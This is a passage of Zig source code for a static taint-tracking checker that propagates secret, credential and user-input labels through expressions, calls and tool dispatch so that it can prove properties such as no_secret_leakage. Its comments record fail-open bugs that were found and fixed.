        if (self.user_fn_decls.contains(key) or self.import_bindings.contains(key)) return LabelSet.empty;
        return .{ .unknown = true };
    }

    /// Labels a value carries. The empty set is a claim - "this carries
    /// nothing" - so an arm that returns it because the walk could not look is
    /// a fail-open, and five of those shipped before anyone noticed. Reading
    /// the arms is how they were missed; running a handler through each
    /// position is how they were found.
    ///
    /// Every position that can hold a value was probed with a handler that
    /// launders `env("SECRET_KEY")` through it into the response. Result, so
    /// the next pass does not re-derive it:
    ///
    ///   carried:      binary and template concatenation, ternary, match arms,
    ///                 member and computed reads, optional chains,
    ///                 assignment, array and object literals, object spread,
    ///                 array and object destructuring, for-of bindings, array
    ///                 HOFs, JSX trees and expression containers, user calls,
    ///                 imported-file calls, closures, callbacks a module
    ///                 invokes, and the pipe operator
    ///   unreachable:  object methods and getters and setters (rejected at
    ///                 parse, with a property holding an arrow suggested
    ///                 instead, which is carried), spread in a call argument
    ///                 (arity is checked before expansion, so it does not type
    ///                 check), sequence and comma expressions (a tag and an
    ///                 `ir.zig` arm exist, no parser path emits them), await
    ///                 and yield (not in the subset)
    ///
    /// Adding an expression kind means probing it, not reasoning about it.
    fn inferLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        if (node == null_node) return LabelSet.empty;
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;

        switch (tag) {
            .lit_int, .lit_float, .lit_string, .lit_bool, .lit_undefined => return LabelSet.empty,

            .identifier => {
                const binding = self.bindingAt(node) orelse return LabelSet.empty;
                const key = packBindingKey(binding.scope_id, binding.slot);
                // A use of a name with an origin is where an aggregate is
                // forwarded or a field is read (P8). Its labels are already on
                // the binding; this only records the status.
                if (self.binding_origins.get(key)) |origin| _ = self.declaredLabels(origin, true);
                if (self.binding_labels.get(key)) |labels| return labels;
                return self.unrecordedBindingLabels(binding, key);
            },

            .call => {
                const call_data = self.ir_view.getCall(node) orelse return LabelSet.empty;
                const saved_call = self.active_call_node;
                self.active_call_node = node;
                defer self.active_call_node = saved_call;
                const labels = self.withHtmlFact(node, call_data, self.inferCallLabels(call_data));
                // A response or body from a declared source carries the
                // declared labels of everything it contains (M4 T4).
                if (self.originOf(node)) |origin| return LabelSet.merge(labels, self.declaredLabels(origin, true));
                return labels;
            },

            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return LabelSet.empty;
                return LabelSet.merge(self.inferLabels(bin.left), self.inferLabels(bin.right));
            },

            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return LabelSet.empty;
                return LabelSet.merge(
                    self.inferLabels(t.condition),
                    LabelSet.mergeConditional(self.inferLabels(t.then_branch), self.inferLabels(t.else_branch)),
                );
            },

            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return LabelSet.empty;
                // A member read on a value from a declared source is precise:
                // it drops the declared labels the aggregate held and takes
                // those of its own path, so a sibling field is not labelled.
                const object_origin = self.originOf(member.object);
                if (object_origin != null) self.member_object_depth += 1;
                var labels = self.inferLabels(member.object);
                if (object_origin != null) self.member_object_depth -= 1;
                if (object_origin) |origin| {
                    const inherited = self.declaredLabels(origin, false);
                    if (inherited.secret) labels.secret = false;
                    if (inherited.credential) labels.credential = false;
                    if (self.originOf(node)) |child| labels = LabelSet.merge(labels, self.declaredLabels(child, true));
                }

                // req.subject / req.tenant come from the runtime's verifier
                // (M4 T5), so the request's user_input label does not reach
                // them.
                if (self.isReqIdentityMember(member.object, member.property)) {
                    return self.reqIdentityLabels(labels);
                }

                // req.headers.authorization carries credential label
                if (self.carrierKind(member.object) == .headers) {
                    const prop_name = self.resolveAtomName(member.property) orelse return labels;
                    if (std.mem.eql(u8, prop_name, "authorization")) {
                        return LabelSet.merge(labels, .{ .credential = true });
                    }
                }

                // result.value inherits labels from the producing validation call
                const prop_name = self.resolveAtomName(member.property) orelse return labels;
                if (std.mem.eql(u8, prop_name, "value")) {
                    const obj_tag = self.ir_view.getTag(member.object) orelse return labels;
                    if (obj_tag == .identifier) {
                        const binding = self.bindingAt(member.object) orelse return labels;
                        const key = packBindingKey(binding.scope_id, binding.slot);
                        if (self.result_binding_labels.get(key)) |result_labels| {
                            labels = LabelSet.merge(labels, result_labels);
                        }
                    }
                }

                return labels;
            },

            .computed_access => {
                const member = self.ir_view.getMember(node) orelse return LabelSet.empty;
                const labels = self.inferLabels(member.object);
                // req["subject"] / req["tenant"]: the computed spelling of the
                // verified identity read, with the same labels.
                if (self.isReqBinding(member.object) and self.ir_view.getTag(member.computed) == .lit_string) {
                    if (self.ir_view.getStringIdx(member.computed)) |str_idx| {
                        if (self.ir_view.getString(str_idx)) |key| {
                            if (isReqIdentityField(key)) return self.reqIdentityLabels(labels);
                        }
                    }
                }
                // req.headers["authorization"] is the dominant header-read idiom
                // and carries the credential label, mirroring the dot-access form.
                if (self.carrierKind(member.object) == .headers) {
                    if (self.ir_view.getTag(member.computed) == .lit_string) {
                        if (self.ir_view.getStringIdx(member.computed)) |str_idx| {
                            if (self.ir_view.getString(str_idx)) |key| {
                                if (std.ascii.eqlIgnoreCase(key, "authorization")) {
                                    return LabelSet.merge(labels, .{ .credential = true });
                                }
                            }
                        }
                    }
                }
                return labels;
            },

            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                    if (prop_tag == .object_property) {
                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                        labels = LabelSet.merge(labels, self.inferLabels(prop.value));
                    } else if (prop_tag == .object_spread) {
                        if (self.ir_view.getOptValue(prop_idx)) |val| {
                            labels = LabelSet.merge(labels, self.inferLabels(val));
                        }
                    }
                }
                return labels;
            },

            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem_idx = self.ir_view.getListIndex(arr.elements_start, i);
                    labels = LabelSet.merge(labels, self.inferLabels(elem_idx));
                }
                return labels;
            },

            .spread => {
                if (self.ir_view.getOptValue(node)) |operand| {
                    return self.inferLabels(operand);
                }
                return LabelSet.empty;
            },

            .match_expr => {
                const match_data = self.ir_view.getMatchExpr(node) orelse return LabelSet.empty;
                var labels = self.inferLabels(match_data.discriminant);
                var i: u8 = 0;
                while (i < match_data.arms_count) : (i += 1) {
                    const arm_idx = self.ir_view.getListIndex(match_data.arms_start, i);
                    const arm = self.ir_view.getMatchArm(arm_idx) orelse continue;
                    labels = LabelSet.merge(labels, self.inferLabels(arm.body));
                }
                return labels;
            },

            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return LabelSet.empty;
                return self.inferLabels(asgn.value);
            },

            .unary_op => {
                // The operand is the second data word; the first holds the
                // operator, so `getOptValue` would read an operator code as a
                // node index and drop the operand's labels (or walk a node
                // that is not the operand at all).
                const unary = self.ir_view.getUnary(node) orelse return .{ .unknown = true };
                return self.inferLabels(unary.operand);
            },

            .method_call => {
                const call_data = self.ir_view.getCall(node) orelse return LabelSet.empty;
                const saved_call = self.active_call_node;
                self.active_call_node = node;
                defer self.active_call_node = saved_call;
                return self.withHtmlFact(node, call_data, self.mergeArgLabels(self.inferLabels(call_data.callee), call_data));
            },

            // A closure passed as a value carries what calling it would
            // produce. Without this arm `["a"].map(() => env("SECRET_KEY"))`
            // unions an empty set for the callback and the secret rides out in
            // the mapped array with no_secret_leakage still proven. A module
            // export answers from its declared labels before any argument is
            // unioned, so `step("k", () => Date.now())` is unaffected: the
            // recorded-and-replayed read stays deterministic.
            .arrow_function, .function_expr => return self.closureResultLabels(node),

            // These are the current no-label, statement-only, or
            // parser-unreachable expression tags. Keep the list exhaustive:
            // adding an expression kind must classify how labels cross it.
            .lit_null,
            .object_property,
            .object_method,
            .object_getter,
            .object_setter,
            .object_spread,
            .await_expr,
            .yield_expr,
            .sequence_expr,
            .comma_expr,
            .match_arm,
            .match_pattern,
            .match_type_test,
            .expr_stmt,
            .var_decl,
            .if_stmt,
            .for_stmt,
            .for_of_stmt,
            .for_in_stmt,
            .while_stmt,
            .do_while_stmt,
            .switch_stmt,
            .case_clause,
            .return_stmt,
            .assert_stmt,
            .throw_stmt,
            .break_stmt,
            .continue_stmt,
            .try_stmt,
            .block,
            .labeled_stmt,
            .function_decl,
            .array_pattern,
            .pattern_element,
            .pattern_rest,
            .pattern_default,
            .import_decl,
            .import_specifier,
            .import_default,
            .import_namespace,
            .export_decl,
            .export_specifier,
            .export_default,
            .export_all,
            .program,
            .param_list,
            .arg_list,
            .stmt_list,
            => return LabelSet.empty,
        }
    }

    /// Labels for a call to an export that builds its return value out of its
    /// arguments: the parsing, decoding, and escaping family, which the
    /// registry marks by declaring `validated`.
    ///
    /// The declared set on its own is a fail-open. `validateJson("s", x)`
    /// answered `{validated}` and nothing more, so every other label the
    /// argument carried was dropped, and a secret routed through it reached the
    /// response with `no_secret_leakage` still PROVEN. The same held for
    /// `coerceJson` and `decodeJson` - three exports across two modules, which
    /// is what makes this a rule about a shape rather than a bug in one row.
    ///
    /// The rule: such an export discharges exactly one label, `user_input`,
    /// because that is what validating a value means. Every other label the
    /// input carried survives it. An escaped secret is still a secret and a
    /// parsed credential is still a credential - the same reasoning the
    /// `renderToString` arm below already applies to escaping.
    fn parsedResultLabels(self: *FlowChecker, base: LabelSet, call_data: Node.CallExpr) LabelSet {
        var labels = self.argDerivedLabels(base, call_data);
        // Cleared after the union, not before: the argument is normally the
        // thing carrying `user_input`, and clearing first would let the merge
        // put it straight back.
        labels.user_input = false;
        return labels;
    }

    /// Labels for a call to an export declaring `derives_from_args`: its result
    /// can contain what an argument carried, and it validates nothing, so every
    /// label survives it. This is `parsedResultLabels` without the discharge -
    /// the two differ by exactly the claim `.validated` makes.
    ///
    /// Without this an export declaring no labels answers the empty set, and a
    /// secret through `dictSet` and back out of `dictGet` reached the response
    /// with `no_secret_leakage` PROVEN.
    fn argDerivedLabels(self: *FlowChecker, base: LabelSet, call_data: Node.CallExpr) LabelSet {
        var labels = base;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            labels = LabelSet.merge(labels, self.inferLabels(arg));
        }
        return labels;
    }

    /// True when this call's declassification may be trusted: either the
    /// export declares no bound, or the argument that bounds it is a numeric
    /// literal at this call site, or the argument is absent and the export's
    /// own default supplies it.
    ///
    /// Fails closed on every shape it cannot read as a literal - an
    /// identifier, an arithmetic expression, a call result - because the whole
    /// question is whether the magnitude is fixed at compile time. A
    /// `comptime()`-folded bound reads as non-literal here and costs a
    /// declassification rather than granting one.
    fn declassificationBoundIsLiteral(
        self: *const FlowChecker,
        slot: u16,
        call_data: Node.CallExpr,
    ) bool {
        const bound = self.module_fn_declassify_bound.get(slot) orelse return true;
        // Argument omitted: the export's own default is the bound, and a
        // default is fixed at compile time.
        if (bound >= call_data.args_count) return true;
        const arg = self.ir_view.getListIndex(call_data.args_start, bound);
        const tag = self.ir_view.getTag(arg) orelse return false;
        return tag == .lit_int or tag == .lit_float;
    }

    /// Infer labels for a function call expression.
    // -----------------------------------------------------------------
    // Declared classifications (M4 T4)
    // -----------------------------------------------------------------

    /// The origin of an expression's value when it comes from a declared
    /// source, or null. Only these shapes carry one: a const binding whose
    /// initializer had one, a `fetch`/`fetchWithRetry`/`serviceCall` call, a
    /// `.json()` call or `.body` read on such a response, and a member read on
    /// a body value. Anything else - a call argument, a spread, an array, a
    /// computed read - drops the origin and keeps the labels, which is the safe
    /// direction.
    fn originOf(self: *FlowChecker, node: NodeIndex) ?Origin {
        if (self.declaration == null or node == null_node) return null;
        const tag = self.ir_view.getTag(node) orelse return null;
        switch (tag) {
            .identifier => {
                const binding = self.bindingAt(node) orelse return null;
                return self.binding_origins.get(packBindingKey(binding.scope_id, binding.slot));
            },
            .call, .method_call => {
                const call_data = self.ir_view.getCall(node) orelse return null;
                return self.callOrigin(call_data);
            },
            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return null;
                const parent = self.originOf(member.object) orelse return null;
                const name = self.resolveAtomName(member.property) orelse return null;
                return switch (parent.part) {
                    .body => parent.child(name),
                    // `resp.body` is the whole body as text: the body root.
                    .response => if (std.mem.eql(u8, name, "body")) bodyRoot(parent) else null,
                };
            },
            // exhaustive: every other expression either is not a value from a
            // declared source or computes a new one; its labels still carry
            // whatever declared labels flowed into it.
            else => return null,
        }
    }

    fn bodyRoot(response: Origin) Origin {
        return .{ .source = response.source, .kind = response.kind, .part = .body };
    }

    fn callOrigin(self: *FlowChecker, call_data: Node.CallExpr) ?Origin {
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return null;
        if (callee_tag == .identifier) {
            const binding = self.bindingAt(call_data.callee) orelse return null;
            const meta = self.module_fn_meta.get(binding.slot) orelse return null;
            if (std.mem.eql(u8, meta.module, "fetch") and
                (std.mem.eql(u8, meta.func, "fetch") or std.mem.eql(u8, meta.func, "fetchWithRetry")))
            {
                return switch (self.literalUrlHost(call_data)) {
                    // A URL this cannot name the host of could be any declared host.
                    .unknown => self.anySource(.fetch),
                    .undeclared => null,
                    .declared => |index| .{ .source = index, .kind = .fetch, .part = .response },
                };
            }
            if (std.mem.eql(u8, meta.module, "service") and std.mem.eql(u8, meta.func, "serviceCall")) {
                const name = self.literalArg(call_data, 0) orelse return self.anySource(.service);
                const index = findSource(self.origin_sources.items, .service, name) orelse return null;
                return .{ .source = index, .kind = .service, .part = .response };
            }
            return null;
        }
        // `resp.json()` or `resp.text()` on a response from a declared source:
        // the body root. `text()` is the whole body as a string, so it carries
        // every declared field the body does.
        if (callee_tag == .member_access or callee_tag == .optional_chain) {
            const member = self.ir_view.getMember(call_data.callee) orelse return null;
            const name = self.resolveAtomName(member.property) orelse return null;
            if (!std.mem.eql(u8, name, "json") and !std.mem.eql(u8, name, "text")) return null;
            const response = self.originOf(member.object) orelse return null;
            if (response.part != .response) return null;
            return bodyRoot(response);
        }
        return null;
    }

    /// A response whose source cannot be named: every entry of that kind then
    /// applies by path, and none can be `matched`. Null when no entry has that
    /// kind, so an undeclared kind costs nothing.
    fn anySource(self: *const FlowChecker, kind: declaration.SourceKind) ?Origin {
        for (self.origin_sources.items) |source| {
            if (source.kind == kind) return .{ .source = null, .kind = kind, .part = .response };
        }
        return null;
    }

    fn literalArg(self: *const FlowChecker, call_data: Node.CallExpr, index: usize) ?[]const u8 {
        if (call_data.args_count <= index) return null;
        const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(index));
        if (self.ir_view.getTag(arg) != .lit_string) return null;
        const str_idx = self.ir_view.getStringIdx(arg) orelse return null;
        return self.ir_view.getString(str_idx);
    }

    /// Which declared host a fetch URL names: `unknown` when the URL is not a
    /// literal or has no host, `undeclared` for a literal host no entry names. Hosts in a declaration are lowercase,
    /// so a literal that differs only in case must still match: the host
    /// component is compared without regard to case.
    fn literalUrlHost(self: *FlowChecker, call_data: Node.CallExpr) UrlHost {
        const url = self.literalArg(call_data, 0) orelse return .unknown;
        const uri = std.Uri.parse(url) catch return .unknown;
        const host_component = uri.host orelse return .unknown;
        const host = switch (host_component) {
            .raw => |raw| raw,
            .percent_encoded => |encoded| encoded,
        };
        for (self.origin_sources.items, 0..) |source, i| {
            if (source.kind == .fetch and std.ascii.eqlIgnoreCase(source.name, host)) return .{ .declared = @intCast(i) };
        }
        return .undeclared;
    }

    const UrlHost = union(enum) { unknown, undeclared, declared: u16 };

    /// The declared labels a value with `origin` carries, and the P8 status it
    /// earns each entry. An entry applies at its exact path, below it, and at
    /// any aggregate above it - forwarding the aggregate forwards the field
    /// (P9 condition a) - and never at a sibling. Matching is by whole path
    /// from the source root (P9 condition b).
    fn declaredLabels(self: *FlowChecker, origin: Origin, mark: bool) LabelSet {
        const decl = self.declaration orelse return LabelSet.empty;
        const observed: []const []const u8 = if (origin.part == .body) origin.path() else &.{};
        var labels = LabelSet.empty;
        for (decl.classifications, 0..) |entry, i| {
            if (entry.source_kind != origin.kind) continue;
            if (origin.source) |index| {
                if (!std.mem.eql(u8, self.origin_sources.items[index].name, entry.source_name)) continue;
            }
            const status: EntryStatus = switch (declaration.relation(entry.path, observed)) {
                .unrelated => continue,
                .exact, .observed_extends_declared => if (origin.source == null) .indeterminate else .matched,
                // An aggregate read only as the object of a member read is not
                // forwarded, so it earns nothing; the member read decides.
                .observed_is_prefix => if (self.member_object_depth > 0) .absent else .indeterminate,
            };
            labels = LabelSet.merge(labels, switch (entry.label) {
                .secret => LabelSet{ .secret = true },
                .credential => LabelSet{ .credential = true },
            });
            if (!mark) continue;
            if (@intFromEnum(status) > @intFromEnum(self.entry_status[i])) self.entry_status[i] = status;
            const index: u32 = @intCast(i);
            switch (entry.label) {
                .secret => self.last_declared_secret = index,
                .credential => self.last_declared_credential = index,
            }
        }
        return labels;
    }

    fn inferCallLabels(self: *FlowChecker, call_data: Node.CallExpr) LabelSet {
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return LabelSet.empty;

        if (callee_tag == .function_expr or callee_tag == .arrow_function) {
            return self.resolvedFunctionCallLabels(call_data.callee, call_data);
        }

        if (callee_tag == .identifier) {
            const binding = self.bindingAt(call_data.callee) orelse return LabelSet.empty;

            // `callTool` has a catalog-directed rule. Its ok value carries the
            // pending argument JSON and the union of every tool the agent may
            // select. `callId` and `name` do not carry into the value. This
            // must precede the export's generic `derives_from_args` rule.
            if (self.isCallToolSlot(binding.slot)) return self.callToolLabels(call_data);

            if (self.module_fn_labels.get(binding.slot)) |base_labels| {
                if (self.env_fn_slot != null and binding.slot == self.env_fn_slot.? and call_data.args_count > 0) {
                    const arg = self.ir_view.getListIndex(call_data.args_start, 0);
                    return self.refineEnvLabels(arg, base_labels);
                }
                if (base_labels.validated) return self.parsedResultLabels(base_labels, call_data);
                if (self.module_fn_arg_derived.contains(binding.slot)) {
                    return self.argDerivedLabels(base_labels, call_data);
                }
                // A declassifier whose magnitude is not a compile-time literal
                // declassifies nothing here: keep the input's labels and let
                // the sink report what reaches it. `mask` is the case -
                // `mask(env("SECRET_KEY"), 4)` is the declassification it
                // exists for, and `mask(env("SECRET_KEY"), n)` for a runtime
                // `n` lets whatever computes `n` choose how much of the secret
                // survives.
                if (!self.declassificationBoundIsLiteral(binding.slot, call_data)) {
                    return self.argDerivedLabels(base_labels, call_data);
                }
                return LabelSet.merge(base_labels, self.closureArgLabels(binding.slot, call_data));
            }

            // Declared no labels of its own, but its result carries whatever
            // its arguments did. Must precede the meta branch below, which
            // answers with the closure labels alone.
            if (self.module_fn_arg_derived.contains(binding.slot)) {
                return self.argDerivedLabels(LabelSet.empty, call_data);
            }

            // A builtin module export with no labels to store above: the empty
            // set is its declared answer, not a gap in the walk. `scanImports`
            // records every builtin import here, including those, so this must
            // precede the user-function summary - which has no body for an
            // import and would otherwise report the value untraceable.
            // Carries whatever a callback it invokes returns, and nothing else:
            // the empty declared set is the export's own answer, not a gap.
            // `step` is the case that matters - it declares no labels at all,
            // so without this a secret read inside its callback would arrive
            // unlabelled while the same read inside `parallel`'s callback,
            // which does declare labels, would not.
            if (self.module_fn_meta.contains(binding.slot)) {
                return self.closureArgLabels(binding.slot, call_data);
            }

            // renderToString(jsx) auto-escapes its output, so a user_input value
            // interpolated into the JSX and sent via Response.html is HTML-safe
            // (defended). Model it as `.validated` so the XSS check does not warn.
            // Escaping does NOT hide a secret/credential, so those labels still
            // propagate through the argument union and fire their sink diagnostics.
            if (self.isRenderToStringCall(call_data.callee)) {
                var labels = LabelSet{ .validated = true };
                for (0..call_data.args_count) |i| {
                    const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                    labels = LabelSet.merge(labels, self.inferLabels(arg));
                }
                return labels;
            }

            // User-defined function call: summarize the callee body when its
            // declaration is visible; otherwise keep the union of argument
            // labels. Returning empty here would launder taint through any
            // wrapper function.
            return self.userCallLabels(binding, call_data);
        }

        // req.headers.get("authorization") carries the credential label, like
        // the dot/computed header-read forms. Must precede the generic union
        // below: the union would return req's user_input label instead of the
        // credential label for this exact shape.
        if (callee_tag == .member_access and self.isAuthHeaderGet(call_data)) {
            return .{ .credential = true };
        }

        // `Date.now()` and `Math.random()` are global member calls rather than
        // module imports, so `scanImports` has no binding to hang a label on
        // and the union below would return the empty set for them. Label the
        // read itself: the value then follows the same path as a clock-reading
        // module export, and reaching the response costs `deterministic` while
        // reaching only a log does not.
        if (callee_tag == .member_access and self.isVaryingGlobalRead(call_data.callee)) {
            return .{ .nondeterministic = true };
        }

        // A route dispatch is an indirect call, but the literal table makes
        // its finite callee set known. Its value carries the union of every
        // resolved route function's return labels. A table or entry that
        // cannot be resolved contributes `.unknown`.
        if (self.routerDispatchLabels(call_data.callee, call_data)) |labels| return labels;

        // A function-valued field of an unmodified literal object is another
        // finite callee set. Resolution refuses spreads, duplicate keys, and
        // any assignment through the object binding.
        if (self.literalObjectMethodLabels(call_data.callee, call_data)) |labels| return labels;

        // Response helpers transmit only their first argument. The runtime
        // currently reads the second argument for status and ignores custom
        // headers, so a callee summary must use the same sink surface.
        if (self.route_summary_depth > 0 and self.isResponseHelper(call_data.callee)) {
            if (call_data.args_count == 0) return LabelSet.empty;
            return self.inferLabels(self.ir_view.getListIndex(call_data.args_start, 0));
        }

        // Known intrinsic calls carry receiver and argument labels. Unknown
        // is limited to unresolved function values: a function parameter
        // (handled in userCallLabels), an unresolved member such as
        // found.handler, a computed array/object/dict element, or a function
        // returned by another call, or a selector expression such as a ternary
        // or nullish coalesce whose result is invoked. Resolved user functions,
        // imported module exports, builtin globals, and primitive/array methods
        // return above or are recognized here and keep their ordinary label
        // union.
        const labels = self.mergeArgLabels(self.inferLabels(call_data.callee), call_data);
        if (self.isUnresolvedFunctionValueCallee(call_data.callee)) {
            // A user method the walk cannot resolve has a body it cannot
            // enter, so a discarded result must clear what a sink decides as
            // well. A builtin method name on a value of unknown type
            // (`receipt.json()`) stays `.unknown` only: clearing for each
            // would cost every proof that touches one.
            if (self.isUnresolvedUserMethodCall(call_data.callee)) return self.unresolvedCallLabels(labels);
            var unknown_labels = labels;
            unknown_labels.unknown = true;
            return unknown_labels;
        }
        return labels;
    }

    /// True for `o.run(...)` that the walk could not resolve, where the method
    /// name is not a builtin one and `o` is not the request: a parameter no
    /// call site bound, a record a function returned, or any other value whose
    /// methods are user closures. A record literal the walk can see was
    /// resolved by `literalObjectMethodLabels` before this point.
    fn isUnresolvedUserMethodCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .member_access and tag != .optional_chain) return false;
        const member = self.ir_view.getMember(callee) orelse return false;
        if (self.assignmentRootBinding(callee)) |root| {
            const key = packBindingKey(root.scope_id, root.slot);
            if (self.req_binding_key) |req_key| {
                if (req_key == key) return false;
            }
        }
        const method = self.resolveAtomName(member.property) orelse return true;
        return !isBuiltinMethodName(method);
    }

    fn isBuiltinMethodName(name: []const u8) bool {
        const extra = [_][]const u8{ "get", "has", "set", "delete", "json", "text", "keys", "values", "entries", "toString", "toFixed", "toISOString" };
        for (extra) |method| {
            if (std.mem.eql(u8, name, method)) return true;
        }
        return isStringMethod(name) or isArrayMethod(name) or isResultMethod(name) or isMathMethod(name);
    }

    /// Union of `callee_labels` and every argument's labels. A closure written
    /// directly as an argument of a method call (`[s].map((x) => ...)`,
    /// `forEach`, `filter`) receives the receiver's elements, so it is walked
    /// with its parameters bound to `callee_labels`, the receiver's labels.
    /// Any other argument is read as before.
    fn mergeArgLabels(self: *FlowChecker, callee_labels: LabelSet, call_data: Node.CallExpr) LabelSet {
        const is_method = self.ir_view.getTag(call_data.callee) == .member_access;
        var labels = callee_labels;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            const arg_tag = self.ir_view.getTag(arg) orelse .lit_undefined;
            if (is_method and (arg_tag == .arrow_function or arg_tag == .function_expr)) {
                labels = LabelSet.merge(labels, self.closureResultLabelsBound(arg, callee_labels));
            } else {
                labels = LabelSet.merge(labels, self.inferLabels(arg));
            }
        }
        return labels;
    }

    fn isCallToolSlot(self: *FlowChecker, slot: u16) bool {
        const facts = self.resolveFacts() orelse return false;
        for (facts.imports.items) |record| {
            if (record.slot != slot or record.resolution != .builtin) continue;
            return std.mem.eql(u8, record.module_specifier, "zttp:tool") and
                std.mem.eql(u8, record.imported_name, "callTool");
        }
        return false;
    }

    fn callToolLabels(self: *FlowChecker, call_data: Node.CallExpr) LabelSet {
        var labels = if (call_data.args_count > 2)
            self.inferLabels(self.ir_view.getListIndex(call_data.args_start, 2))
        else
            LabelSet{ .unknown = true };

        if (!self.listed_tool_routes_ready or self.listed_tool_routes_unresolved or
            self.listed_tool_route_functions.items.len == 0)
        {
            return LabelSet.merge(labels, self.unknownRouteCallLabels());
        }
        for (self.listed_tool_route_functions.items) |function| {
            labels = LabelSet.merge(labels, self.listedToolRouteLabels(function));
        }
        return labels;
    }

    /// Summarize a listed tool as a request root. The synthetic request still
    /// has request provenance on its dispatch fields, while `argsJson` is
    /// joined separately at the call site. Response helpers contribute only
    /// their payload, matching the runtime response body surface.
    fn listedToolRouteLabels(self: *FlowChecker, fn_node: NodeIndex) LabelSet {
        if (self.summary_depth >= max_summary_depth) return self.unresolvedCallLabels(LabelSet.empty);
        for (self.summary_stack[0..self.summary_depth]) |active| {
            if (active == fn_node) return .{ .unknown = true };
        }
        const function = self.ir_view.getFunction(fn_node) orelse return self.unresolvedCallLabels(LabelSet.empty);

        const saved_req_key = self.req_binding_key;
        const saved_identity_trusted = self.req_identity_trusted;
        self.req_binding_key = null;
        self.req_identity_trusted = false;
        self.findHandlerParam(fn_node);
        defer {
            self.req_binding_key = saved_req_key;
            self.req_identity_trusted = saved_identity_trusted;
        }

        self.pushSummaryFrame(fn_node, false);
        defer self.summary_depth -= 1;
        self.route_summary_depth += 1;
        defer self.route_summary_depth -= 1;
        const is_root = std.mem.indexOfScalar(NodeIndex, self.route_function_roots.items, fn_node) != null;
        if (is_root) self.root_dispatch_depth += 1;
        defer if (is_root) {
            self.root_dispatch_depth -= 1;
        };

        const body_tag = self.ir_view.getTag(function.body) orelse return self.unresolvedCallLabels(LabelSet.empty);
        if (body_tag == .block or body_tag == .program or body_tag == .return_stmt) {
            var collected = LabelSet.empty;
            const saved_returns = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved_returns;
            self.walkStmt(function.body);
            return collected;
        }
        return self.exprBodyLabels(function.body);
    }

    fn isUnresolvedFunctionValueCallee(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        return switch (tag) {
            .member_access, .optional_chain => !self.isKnownBuiltinMemberCall(callee),
            // exhaustive: computed elements, call results, binary/ternary selectors,
            // assignments, and every other expression-valued callee have no
            // resolved function body here. True adds `.unknown`, so an
            // unrecognized form costs proof rather than granting it.
            else => true,
        };
    }

    fn routerDispatchLabels(self: *FlowChecker, callee: NodeIndex, call_data: Node.CallExpr) ?LabelSet {
        const facts = self.resolveFacts() orelse return self.unknownRouteCallLabels();
        const resolver = route_resolution.Resolver.init(self.ir_view, self.atoms, facts);
        var targets = resolver.resolveDispatch(self.allocator, callee) catch {
            self.markAllocationFailure();
            return self.unknownRouteCallLabels();
        } orelse return null;
        defer targets.deinit(self.allocator);

        var labels = LabelSet.empty;
        for (targets.functions.items) |function| {
            labels = LabelSet.merge(labels, self.routeFunctionCallLabels(function, call_data));
        }
        if (targets.unresolved) labels = LabelSet.merge(labels, self.unknownRouteCallLabels());
        return labels;
    }

    fn unknownRouteCallLabels(self: *FlowChecker) LabelSet {
        return self.unresolvedCallLabels(LabelSet.empty);
    }

    /// Clear every property that a sink decides, with no diagnostic: the
    /// property becomes unproven, not refused. Called whenever the walk cannot
    /// enter a call, because an unwalked body can hold a sink that the call
    /// site never reaches when its result is discarded.
    fn clearAllSinkProperties(self: *FlowChecker) void {
        self.properties.no_secret_leakage = false;
        self.properties.no_credential_leakage = false;
        self.properties.input_validated = false;
        self.properties.pii_contained = false;
        self.properties.injection_safe = false;
        self.properties.deterministic = false;
    }

    /// The labels of a call the walk could not enter: the labels of its
    /// arguments plus `.unknown`. `.unknown` fails closed only when the value
    /// reaches a sink, so this also clears the properties that a sink decides.
    /// The caller passes the argument labels, or the empty set when none were
    /// read.
    fn unresolvedCallLabels(self: *FlowChecker, arg_labels: LabelSet) LabelSet {
        self.clearAllSinkProperties();
        return LabelSet.merge(arg_labels, .{ .unknown = true });
    }

    fn routeFunctionCallLabels(self: *FlowChecker, fn_node: NodeIndex, call_data: Node.CallExpr) LabelSet {
        const saved_req_key = self.req_binding_key;
        const saved_identity_trusted = self.req_identity_trusted;
        self.req_binding_key = null;
        self.req_identity_trusted = false;
        self.findHandlerParam(fn_node);
        const is_root = std.mem.indexOfScalar(NodeIndex, self.route_function_roots.items, fn_node) != null;
        if (is_root) self.root_dispatch_depth += 1;
        self.route_summary_depth += 1;
        const labels = self.resolvedFunctionCallLabels(fn_node, call_data);
        self.route_summary_depth -= 1;
        if (is_root) self.root_dispatch_depth -= 1;
        self.req_binding_key = saved_req_key;
        self.req_identity_trusted = saved_identity_trusted;
        return labels;
    }

    fn literalObjectMethodLabels(self: *FlowChecker, callee: NodeIndex, call_data: Node.CallExpr) ?LabelSet {
        if (self.ir_view.getTag(callee) != .member_access) return null;
        const member = self.ir_view.getMember(callee) orelse return null;
        const method = self.resolveAtomName(member.property) orelse return null;
        const object_node = self.resolveLiteralObjectMethod(member.object) orelse return null;
        const obj = self.ir_view.getObject(object_node) orelse return self.unresolvedCallLabels(LabelSet.empty);

